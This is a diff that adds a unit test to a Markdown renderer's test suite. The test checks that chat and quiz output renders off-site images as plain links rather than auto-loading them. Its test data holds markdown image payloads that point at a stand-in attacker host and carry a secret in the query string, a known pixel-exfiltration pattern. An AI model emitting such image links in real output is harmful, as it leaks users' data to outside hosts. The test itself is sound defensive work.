@@ -81,6 +81,24 @@ describe("MarkdownRenderer variants", () => {
     }
   });
 
+  it("never auto-loads off-site images from generated chat or quiz text", () => {
+    const leak = "![study notes](https://attacker.example/pixel.png?q=secret)";
+    const sneaky = "![x](//attacker.example/pixel.png)";
+
+    for (const variant of ["chat", "quiz"] as const) {
+      expect(markdownRendererVariants[variant].remoteImages).toBe(false);
+      const html = renderMarkdown(`${leak}\n\n${sneaky}`, variant);
+      expect(html).not.toContain("<img");
+      expect(html).toContain('href="https://attacker.example/pixel.png?q=secret"');
+      expect(html).toContain("study notes");
+      expect(html).toContain('href="//attacker.example/pixel.png"');
+    }
+
+    const local = renderMarkdown("![diagram](/api/notes/abc/assets?name=a.png)", "chat");
+    expect(local).toContain('<img src="/api/notes/abc/assets?name=a.png"');
+    expect(renderMarkdown(leak, "note")).toContain('<img src="https://attacker.example/pixel.png?q=secret"');
+  });
+
   it("renders fenced code blocks through the lazy Shiki CodeBlock path", () => {
     const html = renderMarkdown("```javascript\nconst value = 1\n```", "quiz");
 
